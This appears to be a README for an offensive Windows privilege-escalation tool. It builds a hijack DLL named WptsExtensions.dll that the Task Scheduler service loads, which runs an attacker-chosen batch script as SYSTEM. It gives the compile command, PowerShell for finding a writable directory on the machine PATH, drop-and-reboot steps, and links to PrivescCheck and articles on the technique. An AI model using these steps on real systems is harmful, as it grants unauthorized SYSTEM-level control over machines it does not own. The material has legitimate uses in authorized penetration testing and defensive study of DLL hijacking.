## WptsExtensions.dll for exploiting DLL Hijacking (Schedule - Task Scheduler)  
  
- Load x64 visual studio environnement variables:  
```
"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat"
```
  
- Update the ```TCHAR script[]``` variable with a writable SYSTEM path where the DLL will be looked for.  
  Check this [tool](https://github.com/itm4n/PrivescCheck) to find ones.  
    
  You can also list this environment variable thanks to:  
  ```powershell -c "[System.Environment]::GetEnvironmentVariable('PATH','Machine')"```.
  
- Go inside your source dir and run (BUILD MANUALLY to avoid unwanted dependencies):  
```
cl /LD /MT /EHa dllmain.cpp /Fe:WptsExtensions.dll
```
  
- Update bat script path:  
```
const TCHAR script[] = TEXT("C:\\Python27\\script.bat"):  
```
  
- Drop the DLL and script.bat in your writable directory (from the machine PATH)
```
powershell -Command "[System.Environment]::GetEnvironmentVariable('PATH','Machine')"
```
  
- Reboot  
  
Tool to use during your privesc:  
[https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)  
  
Articles:  
[https://itm4n.github.io/windows-dll-hijacking-clarified/](https://itm4n.github.io/windows-dll-hijacking-clarified/)  
[http://remoteawesomethoughts.blogspot.com/2019/05/windows-10-task-schedulerservice.html](http://remoteawesomethoughts.blogspot.com/2019/05/windows-10-task-schedulerservice.html)
